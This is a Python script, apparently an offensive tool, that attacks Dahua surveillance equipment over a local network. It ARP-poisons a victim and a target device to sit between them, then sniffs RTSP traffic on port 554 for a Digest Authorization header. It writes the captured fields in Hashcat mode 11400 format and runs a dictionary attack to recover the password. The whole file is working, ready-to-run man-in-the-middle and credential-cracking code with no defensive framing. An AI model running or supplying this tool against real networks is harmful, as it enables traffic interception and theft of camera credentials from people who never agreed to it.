from ast import arg
from multiprocessing import Manager, Process
from scapy.layers.l2 import getmacbyip, get_if_addr, get_if_hwaddr, sendp, Ether, ARP
from scapy.layers.inet import TCP
from scapy.all import sniff, conf
import subprocess
import hashlib
import sys
import os


def output_hashcat_target(output, user, realm, method, uri, nonce, hash):
    """
    Generate a target compatible with Hashcat mode 11400 and output
    it to the contents of the specified output file.
    """

    target = f"$sip$***{user}*{realm}*{method}**{uri}**{nonce}****MD5*{hash}"
    file = open(output, "w")
    file.write(target + "\n")
    file.close()


def arp_poison(iface, iface_mac, target_ip, target_mac, source_ip):
    """
    Poison the ARP tables of a target with the MAC of the device running
    this script and a target IP. It uses the specified network interface
    and its MAC and sends an ARP packet every second to the target to
    trick it into thinking this device's IP is the source IP.
    """

    packet = Ether() / ARP()
    packet[Ether].src = iface_mac
    packet[ARP].hwsrc = iface_mac
    packet[ARP].psrc = source_ip
    packet[ARP].hwdst = target_mac
    packet[ARP].pdst = target_ip
    sendp(packet, iface=iface, inter=1, loop=1, verbose=False)


def dahua_rtsp_hash(username, realm, password, method, uri, nonce):
    """
    Generate the 'response' hash from session parameters and a password. Uses
    HTTP Digest access authorization with MD5 to generate a hash. For more info,
    see: https://en.wikipedia.org/wiki/Digest_access_authentication

    The parameters follow the respective field names in Dahua's Authorization
    headers when connecting over RTSP. The method parameter refers to the RTSP
    directive used (e.g. OPTION, DESCRIBE, PLAY, etc.)
    """

    ha1_str = username + ":" + realm + ":" + password
    ha2_str = method + ":" + uri

    ha1 = hashlib.md5(ha1_str.encode())
    ha2 = hashlib.md5(ha2_str.encode())

    response_str = ha1.hexdigest() + ":" + nonce + ":" + ha2.hexdigest()
    response = hashlib.md5(response_str.encode())

    return response.hexdigest()


def sniff_rtsp_authorization(source_ip, target_ip, output):
    """
    Sniff packets coming through the device running the script. It filters out
    RTSP packets originating from a certain IP and going to a certain other.

    Sniffed packets are filtered on whether they have a (populated) Authorization
    header, which is the only case in which they are useful in this tool. When one
    has been found, the dictionary of Authorization fields is written to sniff_result
    and the function exits the current thread.
    """

    def read_packet(pkt):
        if pkt and pkt[TCP] and pkt[TCP].payload:
            payload = "".join(map(chr, bytes(pkt[TCP].payload)))
            authorization = [line for line in payload.split(
                "\n") if "Authorization" in line]
            if len(authorization) > 0:
                authorization = authorization[0].removeprefix(
                    "Authorization: Digest ")
                field_dict = {field.partition("=")[0]: field.partition("=")[2].strip(
                    "\r").strip("\"") for field in authorization.split(", ")}
                if field_dict["username"] != "":
                    field_dict["method"] = payload.split("\n")[0].split(" ")[0]
                    output["auth"] = field_dict
                    return True
        return False

    rtsp_filter = f'src host {source_ip} && dst host {target_ip} && tcp dst port 554'
    sniff(filter=rtsp_filter, iface=conf.iface, stop_filter=read_packet)


if __name__ == "__main__":
    target_file = os.path.abspath("target.txt")
    cracked_file = os.path.abspath("cracked.txt")

    if len(sys.argv) < 4:
        print("Incorrect number of arguments!")
        exit(1)

    # Read command line arguments
    victim_ip = sys.argv[1]
    victim_mac = getmacbyip(victim_ip)
    target_ip = sys.argv[2]
    target_mac = getmacbyip(target_ip)
    dict_file = os.path.abspath(sys.argv[3])
    hashcat_dir = sys.argv[4] if len(sys.argv) > 4 else None

    # Get current device's IP and MAC
    attacker_iface = conf.iface
    attacker_ip = get_if_addr(attacker_iface)
    attacker_mac = get_if_hwaddr(attacker_iface)

    # Create manager so we can return packet info from sniffer
    manager = Manager()
    shared = manager.dict()

    # Create processes for poisoning and sniffing
    sniff_proc = Process(target=sniff_rtsp_authorization,
                         args=(victim_ip, target_ip, shared))
    victim_proc = Process(target=arp_poison, args=(
        attacker_iface, attacker_mac, victim_ip, victim_mac, target_ip))
    target_proc = Process(target=arp_poison, args=(
        attacker_iface, attacker_mac, target_ip, target_mac, victim_ip))

    # Start processes
    print("Starting sniffing and poisoning...")
    sniff_proc.start()
    victim_proc.start()
    target_proc.start()

    # Wait for sniff process to exit
    sniff_proc.join()
    print("Stopping sniffing and poisoning...")
    victim_proc.terminate()
    target_proc.terminate()

    # A packet has been found, so output to Hashcat format
    auth = shared["auth"]
    output_hashcat_target(target_file, auth["username"], auth["realm"],
                          auth["method"], auth["uri"], auth["nonce"], auth["response"])

    # Launch a dictionary attack on the target
    print("Starting Hashcat dictionary attack...")
    hashcat_exe = "hashcat.exe" if os.name == "nt" else "hashcat"
    if hashcat_dir:
        os.chdir(hashcat_dir)
        hashcat_exe = os.path.join(os.getcwd(), hashcat_exe)
    subprocess.run([hashcat_exe, "-m", "11400", "-a", "0", target_file,
                   dict_file, "--potfile-disable", "-o", cracked_file])
